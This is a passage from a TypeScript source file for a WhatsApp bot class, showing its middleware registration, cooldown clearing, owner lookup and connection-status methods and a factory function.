this.commandSystem.use(middleware);\n  }\n\n  public clearCooldowns(): void {\n    this.commandSystem.clearCooldowns();\n  }\n\n  public getOwners(): Owner[] {\n    return this.config.owners;\n  }\n\n  public isOwner(jid: string): boolean {\n    return this.config.owners.some(o => o.jid === jid);\n  }\n\n  public isConnected(): boolean {\n    return this.isRunning && this.sock !== null && this.sock.user !== undefined;\n  }\n\n}\n\nexport const createWhatsAppBot = (config: BotConfig): WhatsAppBot => new WhatsAppBot(config);"]}